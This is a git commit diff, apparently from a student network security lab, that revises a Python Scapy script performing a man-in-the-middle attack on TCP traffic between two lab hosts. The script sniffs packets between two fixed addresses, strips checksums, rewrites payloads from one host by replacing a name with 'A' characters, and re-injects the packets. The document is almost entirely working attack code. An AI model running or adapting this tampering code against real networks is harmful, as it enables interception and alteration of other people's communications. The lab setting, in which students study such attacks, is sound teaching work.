c2f64744b3a0dbebcb3e58d0a76f08dc153f576e
nigeldouglas-itcarlow <126002808+nigeldouglas-itcarlow@users.noreply.github.com>
2023-02-27 22:17:41 +0000

    Update mitm-netcat-working.py

--- mitm-netcat-working.py
+++ mitm-netcat-working.py
@@ -1,50 +1,47 @@
 #!/usr/bin/env python3
-
 from scapy.all import *
 
-# Set up the necessary IP and MAC addresses for packet sniffing and spoofing
-MY_SECRET_NAME = "Nigel"
+# Define variables
+MY_NAME = "Nigel"
 IP_A = "10.9.0.5"
 MAC_A = "02:42:0a:09:00:05"
 IP_B = "10.9.0.6"
 MAC_B = "02:42:0a:09:00:06"
 
-# Define the function to spoof the packets
-def packet_spoofing(pkt):
-    # Check if the source and destination IP addresses match those we are targeting
-    if pkt[IP].src == IP_A and pkt[IP].dst == IP_B:
-        # Create a new packet based on the original packet
-        new_pkt = IP(bytes(pkt[IP]))
-        # Remove the checksums and payload from the new packet
-        del(new_pkt.chksum)
-        del(new_pkt[TCP].payload)
-        del(new_pkt[TCP].chksum)
+# Function to spoof packets
+def packet_spoofing(packet):
+    # If packet is from A to B
+    if packet[IP].src == IP_A and packet[IP].dst == IP_B:
+        # Create a new IP packet from the old packet
+        new_packet = IP(bytes(packet[IP]))
+        # Delete checksum fields and payload from TCP layer
+        del(new_packet.chksum)
+        del(new_packet[TCP].payload)
+        del(new_packet[TCP].chksum)
 
-        # If the packet has a payload, modify it
-        if pkt[TCP].payload:
-            # Decode the payload and replace the secret name with X's
-            data = pkt[TCP].payload.load
+        if packet[TCP].payload:
+            # Extract and modify the payload data
+            data = packet[TCP].payload.load
             data = data.decode()
-            print("Original text: "+data)
-            new_data = data.replace(MY_SECRET_NAME, 'A' * len(MY_SECRET_NAME))
-            print("Modified text: "+new_data)
+            print("Original data: " + data)
+            new_data = data.replace(MY_NAME, 'A' * len(MY_NAME))
+            print("Modified data: " + new_data)
             # Send the modified packet
-            send(new_pkt/new_data, verbose=False)
+            send(new_packet/new_data, verbose=False)
         else:
-            # If the packet doesn't have a payload, just send the modified packet
-            send(new_pkt, verbose=False)
+            # Send the unmodified packet
+            send(new_packet, verbose=False)
+    # If packet is from B to A
+    elif packet[IP].src == IP_B and packet[IP].dst == IP_A:
+        # Create a new IP packet from the old packet
+        new_packet = IP(bytes(packet[IP]))
+        # Delete checksum fields from TCP layer
+        del(new_packet.chksum)
+        del(new_packet[TCP].chksum)
+        # Send the packet
+        send(new_packet, verbose=False)
 
-    # Check if the source and destination IP addresses match those we are targeting (in reverse order)
-    elif pkt[IP].src == IP_B and pkt[IP].dst == IP_A:
-        # Create a new packet based on the original packet
-        new_pkt = IP(bytes(pkt[IP]))
-        # Remove the checksums from the new packet
-        del(new_pkt.chksum)
-        del(new_pkt[TCP].chksum)
-        # Send the modified packet
-        send(new_pkt, verbose=False)
-
-# Set up the filter to capture the necessary packets for spoofing
-my_filter = 'tcp and (ether src 02:04:0a:09:00:05 or ether src 02:42:0a:09:00:06)'
-# Start sniffing packets and calling the packet_spoofing function on each one
+# Define the filter for sniffing packets
+my_filter = 'tcp and (ether src 02:42:0a:09:00:05 or ether src 02:42:0a:09:00:06)'
+# Sniff packets on eth0 interface, apply filter, and call packet_spoofing function
 sniffed_packet = sniff(iface='eth0', filter=my_filter, prn=packet_spoofing)
